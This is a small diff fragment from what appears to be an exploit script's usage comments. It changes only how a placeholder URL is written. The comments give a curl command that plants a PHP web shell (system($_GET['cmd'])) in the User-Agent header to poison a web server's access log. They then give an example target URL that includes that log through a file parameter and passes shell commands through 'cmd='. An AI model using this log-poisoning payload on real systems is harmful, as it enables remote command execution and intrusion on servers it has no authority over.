@@ -3,7 +3,7 @@
 
 #
 # First run:
-# $ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "<http://RHOST:RPORT>"
+# $ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"
 #
 # Target URL would be (for exmaple):
 # http://RHOST:RPORT/browse.php?file=/var/log/httpd-access.log&cmd=
